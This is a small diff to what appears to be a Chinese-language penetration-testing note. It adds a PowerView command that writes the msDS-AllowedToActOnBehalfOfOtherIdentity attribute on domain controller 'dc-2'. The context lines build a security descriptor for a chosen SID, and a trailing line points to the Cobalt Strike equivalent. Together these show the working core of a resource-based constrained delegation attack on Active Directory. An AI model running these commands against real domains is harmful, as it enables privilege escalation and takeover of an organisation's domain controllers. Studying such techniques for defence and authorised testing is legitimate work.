@@ -791,6 +791,7 @@ S-1-5-21-569305411-121244042-2357301523-1109
 $rsd = New-Object Security.AccessControl.RawSecurityDescriptor "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-569305411-121244042-2357301523-1109)"
 $rsdb = New-Object byte[] ($rsd.BinaryLength)
 $rsd.GetBinaryForm($rsdb, 0)
+Get-DomainComputer -Identity "dc-2" | Set-DomainObject -Set @{'msDS-AllowedToActOnBehalfOfOtherIdentity' = $rsdb} -Verbose
 ```
 
 在CS里，上面的命令是：
